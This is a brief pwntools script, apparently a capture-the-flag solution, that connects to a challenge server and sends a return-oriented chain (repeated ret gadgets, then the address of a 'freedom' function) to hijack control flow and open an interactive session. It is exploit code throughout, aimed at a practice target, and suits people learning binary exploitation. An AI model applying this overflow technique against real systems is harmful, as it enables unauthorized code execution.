from pwn import *

p = remote("fitsec-bb-pwn-3.chals.io", 443,
           ssl=True, sni="fitsec-bb-pwn-3.chals.io")

ret     = 0x4014bc 
freedom = 0x40145d
 
chain = p64(ret)*11
chain += p64(freedom)

p.sendlineafter(b'>>>',chain)

p.interactive()

